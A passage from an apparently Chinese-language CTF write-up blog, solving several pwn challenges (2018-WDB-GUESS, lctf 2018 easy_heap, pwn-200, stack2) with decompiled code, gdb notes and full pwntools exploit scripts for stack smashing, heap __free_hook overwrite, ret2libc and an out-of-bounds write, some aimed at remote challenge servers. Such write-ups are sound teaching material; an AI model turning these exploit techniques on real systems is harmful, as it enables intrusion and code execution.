class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">7</span>*<span class="number">8</span> + p64(back) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">change(<span class="number">4</span>, payload)</span><br><span class="line">change(<span class="number">0</span>,p64(<span class="number">0x602090</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># edit stdout-pointer to io-file-plus</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9jYTc0OGI1NjExNWU=">https://www.jianshu.com/p/ca748b56115e<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cDovL2IwbGRmcmV2LnRvcC8yMDE4LzA5LzA1LyVFNyVCRCU5MSVFOSVCQyU4RSVFNiU5RCVBRlB3biVFNCVCOSU4QmJsaW5kLw==">http://b0ldfrev.top/2018/09/05/网鼎杯Pwn之blind/<i class="fa fa-external-link-alt"></i></span></p>
<p>p *(struct _IO_FILE_plus *) stdout</p>
<h2 id="2018-WDB-GUESS">2018-WDB-GUESS</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522010905.png" alt="20210522010905"></p>
<p>拖到ida里f5<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522011430.png" alt="20210522011430"></p>
<p>程序把flag保存到栈上，然后将输入的值和flag进行比较，如果错误就新fork一个进程。漏洞函数明显在gets上，因为有两次fork的机会，所以可以肆无忌惮地触发canary达到某些目的（stack smash）</p>
<ul>
<li>argv[] 保存了环境变量，argv[0]保存的是程序路径，覆盖argv[0]可以使得触发stack smash的时候输出有用的东西，SS代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有两种方法找到argv[0]的地址：</p>
<ol>
<li>在main下断点</li>
<li>print &amp;__libc_argv[0]</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522013616.png" alt="20210522013616"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522013633.png" alt="20210522013633"></p>
<p>接下来就要找到s2和argv[0]之间的距离，这个通过gdb调试就可以得到<br>
这样，如果把argv[0]中的内容改为puts的got地址，就能将其输出，进而得到libc版本</p>
<p>第二步是找到flag在栈中的地址。<br>
在libc中有一个_environ函数，指向栈中保存着环境变量的地址，这个地址和[flag]之间的偏移是不变化的<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210522020339.png" alt="20210522020339"></p>
<p>wp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27846</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./GUESS&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./GUESS&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># argv[0] stores file PATH by default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;argv[0]==0x7fffffffde48</span></span><br><span class="line"><span class="comment"># gets-&gt;0x7fffffffdd20</span></span><br><span class="line"></span><br><span class="line">offset1 = <span class="number">0xe48</span> - <span class="number">0xd20</span></span><br><span class="line"><span class="comment">#print hex(offset1)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x128</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">puts = u64(p.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts)</span><br><span class="line">base = puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (environ)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x128</span> + p64(environ_addr - <span class="number">360</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7fffffffde58 - 0x7fffffffdcf0</span></span><br></pre></td></tr></table></figure>
<h2 id="lctf-2018-easy-heap">lctf 2018 easy_heap</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./easy_heap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size,context</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size \n&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content \n&gt; &quot;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index \n&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;which command?\n&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index \n&gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;111&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># place in unsorted_bin and tcache bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x200</span></span><br><span class="line"><span class="comment"># split unsorted chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;77777777&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;88888888&quot;</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;99999999&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 3 prev_inuse</span></span><br><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line"></span><br><span class="line">	malloc(<span class="number">0x10</span>,<span class="string">&quot;4444&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;5555&quot;</span>)<span class="comment">###?</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">##??</span></span><br><span class="line">uns_bin = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc.address = uns_bin - <span class="number">0x3ebca0</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;9999&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM2OTc4OTI=">https://blog.csdn.net/qq_41202237/article/details/113697892<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDc4NjIuaHRt">https://bbs.pediy.com/thread-247862.htm<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="pwn-200">pwn-200</h2>
<p>写这题的时候有半个多月没有接触栈溢出了…算是拿这题复习一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec b</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/b&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>用ROPgadget搜索没有发现system和/bin/sh，于是猜到大概是要ret2libc</p>
<p>ida打开，程序很简单:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  write(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  sub_8048484();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现sub_8048484()存在栈溢出</p>
<p>复习一下找libc版本–&gt;getshell的步骤：</p>
<ol>
<li>用puts、write、printf之类的函数打印出某个函数的got，同时要控制好打印后的返回地址</li>
<li>获得libc的版本、system函数，/bin/sh的地址等，并计算在plt中的位置</li>
<li>构造payload</li>
</ol>
<p>这题我们使用write()打印出write.got：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">addr_out = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(write_plt) + p32(<span class="number">0x080483D0</span>) + p32(<span class="number">1</span>) + p32(write_got) +p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#1+write_got+4==write(..,..,..)</span></span><br><span class="line"><span class="comment">#返回地址为程序入口地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>, addr_out)</span><br><span class="line">a = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">write_got_addr =  a</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_got_addr)</span><br></pre></td></tr></table></figure>
<p>这里提示一下，“p32(1) + p32(write_got) +p32(4)”构造的是一个write函数的参数，之前看别人的wp想了好久1和4是啥…太蠢了</p>
<p>用低12位搜索libc的时候注意，查看的是16进制的地址，别再在这卡一个晚上了…将地址和偏移地址进行计算的时候不用转成16进制（str和int的问题）</p>
<p>后续的代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">write_off = <span class="number">0x0d43c0</span></span><br><span class="line">sys_off = <span class="number">0x03a940</span></span><br><span class="line">binsh_off = <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line">base = write_got_addr - write_off</span><br><span class="line">sys = sys_off + base</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(sys) + p32(<span class="number">1</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这个payload比较简短，看到另一种做法如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次结束后返回start的地址</span></span><br><span class="line"></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span></span><br><span class="line"><span class="comment">#三次pop指令的地址</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">payload2 =<span class="string">&#x27;A&#x27;</span>*junk+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span></span><br><span class="line">payload2+=p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>思路值得学习</p>
<h2 id="stack2">stack2</h2>
<p>首先checksec：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec stack2</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/stack2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位程序，嗯 回忆一下传参方式，是直接放在函数后面，没有用到寄存器的<br>
看到有栈溢出保护，似乎先要泄露canary，继续。</p>
<p>程序很简单，修饰一些变量名后如下(忽略无关语句)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> stack_size; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choose; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> number[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//blah blah blah</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;stack_size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; stack_size &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    number[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = stack_size; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choose);</span><br><span class="line">          <span class="keyword">if</span> ( choose != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">99</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            number[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choose &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( choose != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, number[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choose != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;stack_size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      number[stack_size] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choose != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += number[l];</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//无力吐槽f5出的代码，不过...能看就行   </span></span><br></pre></td></tr></table></figure>
<p>可以发现在选择3时，没有对输入的stack_size进行判断，所以可以更改栈中任意地址内容的，而且不会被canary发现。<br>
再看程序的函数，发现有system()和一个“hackhere”函数，直接返回了system(“/bin/sh”)（这是一个陷阱，在远程环境里没有用bash，而是使用了sh，但这个函数也提供了sh这个字符串）</p>
<p>所以现在的思路就是，通过choose=3，构造函数的返回地址为system的plt和参数，这就需要找到number这个数组的起始位置和返回地址的偏移量<br>
看ida，似乎偏移是0x74，但是究竟是不是呢？还是通过gdb验证一下吧</p>
<p>我们先把断点断在第一次向number数组输入的时候。此时写入的地址即为数组的首地址<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207210639.png" alt="20201207210639"><br>
（前面输入的内容都为1）</p>
<p>执行前：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EAX  0xffffcf18 ◂— 0xe0</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211134.png" alt="20201207211134"></p>
<p>执行后：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211413.png" alt="20201207211413"></p>
<p>所以首地址在cf18的位置，查看此时栈帧<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201207211929.png" alt="20201207211929"><br>
所以偏移为：cf9c-cf18==0x84<br>
(ida错了！！！)</p>
<p>因此可以易得exp了：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./stack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">53339</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">	addr = <span class="built_in">str</span>(addr)</span><br><span class="line">	data = <span class="built_in">str</span>(data)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,addr)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys: 0x08048450</span></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#sh: 0x08048987</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">1</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit\n&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>getshell</p>
<h2 id="pwn100">pwn100</h2>
<p>checksec :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec pwn100 </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/pwn100&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>partial relro+NX<br>
进入ida&amp;f5，经过两次调用后看到主要的函数为：</p>
